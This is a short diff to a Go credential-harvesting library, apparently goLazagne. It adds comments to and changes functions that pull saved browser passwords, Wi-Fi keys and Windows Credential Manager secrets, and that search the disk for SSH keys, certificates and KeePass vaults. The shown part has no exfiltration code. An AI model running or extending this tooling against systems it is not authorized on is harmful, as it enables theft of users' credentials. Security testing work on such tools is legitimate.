@@ -8,6 +8,8 @@ import (
 	"github.com/kerbyj/goLazagne/windows"
 )
 
+
+//Common function for work with browsers. Just call and function return all saved passwords in chromium browsers and firefox
 func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 	var AllBrowsersData []common.UrlNamePass
 	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
@@ -21,6 +23,7 @@ func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 	return AllBrowsersData, len(AllBrowsersData)
 }
 
+//Function for extracting WPA2 PSK stored profiles
 func ExtractWifiData() ([]common.NamePass, int) {
 	var resultWifi = wifi.WifiExtractDataRun()
 	if resultWifi.Success {
@@ -29,6 +32,7 @@ func ExtractWifiData() ([]common.NamePass, int) {
 	return nil, 0
 }
 
+//Function for extracting saved BLOBs in windows credential storage
 func ExtractCredmanData() ([]common.UrlNamePass, int) {
 	var windowsResult = windows.CredManModuleStart()
 	if windowsResult.Success {
@@ -37,8 +41,9 @@ func ExtractCredmanData() ([]common.UrlNamePass, int) {
 	return nil, 0
 }
 
-func ExtractInterestingFiles() []string {
-	var data = filesystem.FindFiles()
+//Function to search for files on the file system with specific extensions. By default, module search for files with suffixes "ovpn", "pem", "ppk", "cert", "ssh", "kdbx", "id_rsa", "id_dsa". You can put a custom list in the arguments, which will be added to the default list.
+func ExtractInterestingFiles(additionalSuffixes []string) []string {
+	var data = filesystem.FindFiles(additionalSuffixes)
 	return data
 }
 
@@ -116,7 +121,7 @@ func (config LazagneLockPick) ExtractData() {
 	}
 }
 
-//Function to extract all credentials from browsers, wifi passwords, and passwords from windows credential manager
+//Function in "give me all" style. The function will return everything that the program can extract from OS.
 func ExtractAllData() (AllDataStruct, int) {
 	var wifiData, lengthWiFiData = ExtractWifiData()
 	var browserData, lengthBrowserData = ExtractBrowserCredentials()
